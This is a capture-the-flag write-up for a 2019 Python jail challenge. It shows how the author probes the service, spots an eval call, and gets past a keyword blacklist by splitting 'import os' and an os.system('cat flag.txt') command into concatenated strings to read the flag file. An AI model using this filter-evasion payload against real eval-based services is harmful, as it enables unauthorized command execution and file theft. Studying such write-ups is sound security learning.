# genericpyjail - 50pt (180 solves)

```
Written by: dns

When has a blacklist of insecure keywords EVER failed?

nc chall2.2019.redpwn.net 6006
```

This challenge we have python sand box escape mission.
We are running inside a python program and our mission is to escape to the shell OS or to execute our code in order to read the flag file.
We starts with `blacklist.txt` file that contains black list key words (WE CAN NOT USE THEM).
Connect to the server `nc chall2.2019.redpwn.net 6006` and start fuzzing:
```
tom@DESKTOP-AMN3CC9:/mnt/c/Windows/System32$ nc chall2.2019.redpwn.net 6006
wow! there's a file called flag.txt right here!
>>> 5
>>> '4'
>>> hello
Traceback (most recent call last):
  File "jail1.py", line 49, in <module>
    data = eval(data)
  File "<string>", line 1, in <module>
NameError: name 'hello' is not defined
```
From the error message we are able to see part of the code:
```
data = eval(data)
```
`data` it's probably our input.
So, we can send to the server python code, the server will check if our data doesn't contains black list key words, and will execute our commands if everything is OK.
**WE NEED TO READ FILE CALLED flag.txt** so we need to import os module, and execute `os.system('cat flag.txt')` to read the flag.
Limitations:
1.	We can't use `import`, `os` words in our commands
```
wow! there's a file called flag.txt right here!
>>> import os
That's not allowed here
>>>
```
but we can separate our payload, and there will not be any black list word, something like this: `"impor" + "t o" + "s"` == `"import os"`
```
wow! there's a file called flag.txt right here!
>>> "impor" + "t o" + "s"
>>>
```
And we successfully bypassed the limitation !!!
Let's import os module and read the file:
```
tom@DESKTOP-AMN3CC9:/mnt/c/Windows/System32$ nc chall2.2019.redpwn.net 6006
wow! there's a file called flag.txt right here!
>>> "impor" + "t o" + "s"
>>> "o" + "s.s" + "ystem('dir')"
bin   dev  flag.txt  jail1.py  lib64  mnt  proc  run   srv  tmp  var
boot  etc  home      lib       media  opt  root  sbin  sys  usr
>>> "o" + "s.s" + "ystem('cat flag.txt')"
flag{bl4ckl1sts_w0rk_gre3344T!}
>>>
```
